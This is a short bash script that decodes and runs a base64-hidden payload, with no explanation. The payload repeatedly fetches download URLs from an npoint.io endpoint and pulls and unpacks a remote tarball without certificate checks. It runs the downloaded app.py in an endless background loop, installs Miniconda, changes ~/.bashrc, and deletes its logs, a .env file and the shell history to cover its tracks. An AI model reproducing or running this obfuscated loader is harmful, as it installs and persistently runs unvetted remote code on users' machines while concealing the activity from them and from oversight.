#!/usr/bin/env bash

set -e

TMP_SCRIPT=$(mktemp /tmp/bum.XXXXXX.sh)
chmod +x "$TMP_SCRIPT"

base64 -d << 'EOF' | tr -d '\r' > "$TMP_SCRIPT"
ZWNobyAnIyEvYmluL2Jhc2gKWyAtZiBweXRob24tYXV0b21hdGUvYXBwLnB5IF0gfHwgKAojIS9iaW4vYmFzaAoKd2hpbGUgdHJ1ZTsgZG8KICBlY2hvICJM4bqleSBkYW5oIHPDoWNoIFVSTCB04burIEFQSS4uLiIKICB1cmxzPSQoY3VybCAtcyBodHRwczovL2FwaS5ucG9pbnQuaW8vMzMzNWViY2VkMDNkZjkxNGNkYzQgfCBqcSAtciAnLmRhdGFzW10nKQogIHN1Y2Nlc3M9ZmFsc2UKCiAgZm9yIHVybCBpbiAkdXJsczsgZG8KICAgIGVjaG8gIlRo4butIHThuqNpIHThu6s6ICR1cmwiCiAgICBpZiB3Z2V0IC0tbm8tY2hlY2stY2VydGlmaWNhdGUgIiR1cmwiIC1PIHB5dGhvbi1hdXRvbWF0ZS1tYXN0ZXIudGFyLmd6OyB0aGVuCiAgICAgIGlmIHRhciAteHZmIHB5dGhvbi1hdXRvbWF0ZS1tYXN0ZXIudGFyLmd6OyB0aGVuCiAgICAgICAgcm0gcHl0aG9uLWF1dG9tYXRlLW1hc3Rlci50YXIuZ3oKICAgICAgICBlY2hvICJU4bqjaSB2w6AgZ2nhuqNpIG7DqW4gdGjDoG5oIGPDtG5nIHThu6s6ICR1cmwiCiAgICAgICAgc3VjY2Vzcz10cnVlCiAgICAgICAgYnJlYWsKICAgICAgZWxzZQogICAgICAgIGVjaG8gIkdp4bqjaSBuw6luIGzhu5dpIHThu6s6ICR1cmwiCiAgICAgIGZpCiAgICBlbHNlCiAgICAgIGVjaG8gIlThuqNpIGzhu5dpIHThu6s6ICR1cmwiCiAgICBmaQogIGRvbmUKCiAgaWYgJHN1Y2Nlc3M7IHRoZW4KICAgIGJyZWFrCiAgZWxzZQogICAgZWNobyAiVOG6pXQgY+G6oyBVUkwgxJHhu4F1IGzhu5dpLiBUaOG7rSBs4bqhaSBzYXUgMzAgZ2nDonkuLi4iCiAgICBzbGVlcCAzMAogIGZpCmRvbmUKKScgPiBidW0uc2ggJiYgY2htb2QgK3ggYnVtLnNoICYmIG5vaHVwIC4vYnVtLnNoID4gb3V0LmxvZyAyPiYxICYKCgp3aGlsZSB0cnVlOyBkbwogICAgCiAgICBbICEgLWQgIiQocHdkKS9taW5pY29uZGEiIF0gJiYgd2dldCBodHRwczovL3JlcG8uYW5hY29uZGEuY29tL21pbmljb25kYS9NaW5pY29uZGEzLWxhdGVzdC1MaW51eC14ODZfNjQuc2ggJiYgYmFzaCBNaW5pY29uZGEzLWxhdGVzdC1MaW51eC14ODZfNjQuc2ggLWIgLXAgJChwd2QpL21pbmljb25kYSB8fCBlY2hvICJNaW5pY29uZGEgxJHDoyDEkcaw4bujYyBjw6BpIMSR4bq3dCBz4bq1biIgJiYgCiAgICBybSBNaW5pY29uZGEzLWxhdGVzdC1MaW51eC14ODZfNjQuc2ggfHwgdHJ1ZQogICAgZXhwb3J0IFBBVEg9IiQocHdkKS9taW5pY29uZGEvYmluOiRQQVRIIgogICAgZWNobyAnZXhwb3J0IFBBVEg9IiQocHdkKS9taW5pY29uZGEvYmluOiRQQVRIIicgPj4gfi8uYmFzaHJjIAogICAgUFk9JChmaW5kICRIT01FIC10eXBlIGQgLW5hbWUgIm1pbmljb25kYSIgfCB0YWlsIC1uIDEpL2Jpbi9weXRob24KCiAgICAjIFTDrG0gdGjGsCBt4bulYyBweXRob24tYXBwCiAgICAkUFkgLW0gcGlwIGluc3RhbGwgZmxhc2sgZmxhc2tfc29ja2V0aW8gd2Vic29ja2V0LWNsaWVudCBmYXN0YXBpIHV2aWNvcm4gcHl0eiByZXF1ZXN0cwogICAgZGlyPSQoZmluZCB+IC10eXBlIGQgLW5hbWUgJ3B5dGhvbi1hdXRvbWF0ZScgLXByaW50IC1xdWl0KQogICAgaWYgWyAtbiAiJGRpciIgXTsgdGhlbgogICAgICAgIHJtIC1mIGJ1bS5zaCBvdXQubG9nIC5lbnYKICAgICAgICAjIHBraWxsIHB5dGhvbiB8fCB0cnVlCiAgICAgICAgIyBwa2lsbCBweXRob24zIHx8IHRydWUKICAgICAgICBjZCAiJGRpciIgfHwgZXhpdCAxCiAgICAgICAgaGlzdG9yeSAtYyAmJiBoaXN0b3J5IC13CiAgICAgICAgY2xlYXIKICAgICAgICAkUFkgLXUgYXBwLnB5IC1kYXRhc2V0PSI1N2QyNWJmOWFkMTM2NjVlMmRkMiIgPiBzdGRvdXQudHh0IDI+IHN0ZGVyci50eHQKICAgIGVsc2UKICAgICAgICBlY2hvICJLaMO0bmcgdMOsbSB0aOG6pXkgdGjGsCBt4bulYyAncHl0aG9uLWF1dG9tYXRlJyIKICAgIGZpCgogICAgc2xlZXAgMTAKZG9uZQo=
EOF

bash "$TMP_SCRIPT"

rm -f "$TMP_SCRIPT"
